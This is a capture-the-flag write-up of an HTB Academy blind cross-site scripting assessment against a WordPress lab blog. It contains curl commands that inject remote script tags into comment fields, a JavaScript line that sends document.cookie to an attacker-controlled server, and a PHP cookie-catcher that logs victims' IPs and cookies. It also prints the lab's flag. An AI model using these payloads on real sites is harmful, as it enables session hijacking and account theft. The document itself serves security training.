# HTB Academy — CWES Cross-Site Scripting Skills Assessment

**Flag:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`  
**Target:** `10.129.234.166` (VPN)  
**App:** WordPress 5.7.2 Security Blog at `/assessment/`

---

## Attack Chain

### 1. Recon — Find Input Fields
```bash
curl -s http://<TARGET>/assessment/ | grep -i "comment\|feedback\|author\|email\|url\|textarea"
# → Found WordPress comment form on blog post
curl -s "http://<TARGET>/assessment/index.php/2021/06/11/welcome-to-security-blog/" | grep -i "input\|textarea\|name="
# → Fields: comment, author, email, url (website), comment_post_ID=8
```

### 2. Identify Vulnerable Field — Blind XSS Detection
Submit comment via curl with remote script probes in each field:
```bash
curl -s -X POST "http://<TARGET>/assessment/wp-comments-post.php" \
  --data-urlencode "comment=<script src=http://<OUR_IP>:8000/comment></script>" \
  --data-urlencode "author=John Smith" \
  --data-urlencode "email=john@test.com" \
  --data-urlencode 'url="><script src=http://<OUR_IP>:8000/url></script>' \
  -d "comment_post_ID=8&comment_parent=0&submit=Post+Comment"
```
**Result:** PHP server received `GET /url` from target → `url` field is vulnerable.

**Key:** WordPress rejects XSS in `author` field. Keep `author` and `email` clean — only inject in `comment` and `url`.

### 3. Cookie Stealing
```bash
# script.js content:
new Image().src='http://<OUR_IP>:8000/index.php?c='+document.cookie;

# index.php content:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

# Start PHP server:
cd /tmp/tmpserver && sudo php -S 0.0.0.0:8000

# Submit payload:
curl -s -X POST "http://<TARGET>/assessment/wp-comments-post.php" \
  --data-urlencode "comment=test" \
  --data-urlencode "author=John Smith" \
  --data-urlencode "email=john2@test.com" \
  --data-urlencode 'url="><script src=http://<OUR_IP>:8000/script.js></script>' \
  -d "comment_post_ID=8&comment_parent=0&submit=Post+Comment"
```
**Result:** Received `GET /index.php?c=wordpress_test_cookie=...;flag=HTB{cr055_5173_5cr1p71n6_n1nj4}`

---

## Key Lessons

- **Read the full page HTML first** — the post ID (`comment_post_ID=8`) is a hidden field; omitting it silently fails the submission.
- **WordPress rejects XSS in the `author` and `email` fields** — CMS validation blocks payloads there; only inject in `comment` and `url`.
- **Probe each field with a unique path name** — `<script src=http://<IP>:8000/fieldname>` lets you identify the vulnerable field by which path the PHP server receives.
- **A plain URL fetch is not script execution** — the `url` field caused the server to fetch a resource (GET /url), but that's not code execution. The `"><script src=...>` breakout is what converts it to JS execution.
- **Use PHP server, not Python** — the cookie catcher `index.php` runs PHP to log the cookie; `python3 -m http.server` serves static files only and won't execute it.
- **Flag is in a cookie, not the page** — the flag arrived as part of the stolen cookie string (`flag=HTB{...}`), not as page content. Always check all stolen cookies.
